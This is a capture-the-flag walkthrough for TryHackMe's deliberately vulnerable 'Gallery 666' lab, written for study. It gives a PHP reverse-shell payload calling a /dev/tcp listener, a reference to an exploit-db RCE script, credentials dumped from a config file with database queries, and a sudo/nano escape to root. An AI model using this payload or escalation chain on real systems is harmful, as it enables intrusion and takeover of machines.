---
title: Walkthrough - Gallery 666
published: true
---

CMS, Linux, SQLi, RCE. Try to exploit our image gallery system

[https://tryhackme.com/room/gallery666](https://tryhackme.com/room/gallery666)

* * *

## Notes

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Simple Image Gallery System
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```

* * * 

## How many ports are open?

- 2

* * * 

## What's the name of the CMS?

- Simple Image Gallery -  we can use ``/usr/share/exploitdb/exploits/php/webapps/50214.py`` to exploit
- edit the payload ``payload= "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.2.127.225/7777 0>&1'\"); ?>"`` and setup a listener to receive a shell

* * * 

## What's the hash password of the admin user?

- ``cat /var/www/html/gallery/initialize.php``

```
cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

- ``mysql -h localhost -p gallery_db -u gallery_user``
- ``show tables;``
- ``select * from users;``

* * * 

## What's the user flag?

- running linpeas.sh found something interesting

```
╔══════════╣ Searching passwords in history files
      @stats   = stats                                      
      @items   = { _seq_: 1  }
      @threads = { _seq_: "A" }
sudo -l b3stpassw0rdbr0xx
sudo -l
```

- use this to su to mike

* * * 

## Escalate to root

```
(remote) mike@gallery:/$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

- ``cat /opt/rootkit.sh``
- this shell script when set to read runs nano as sudo so we can use it to get root. Run the script and "read" and then ``^R^X`` then ``reset; sh 1>&0 2>&0`` to get root

![0xskar](/assets/gallery66601.png)

* * * 
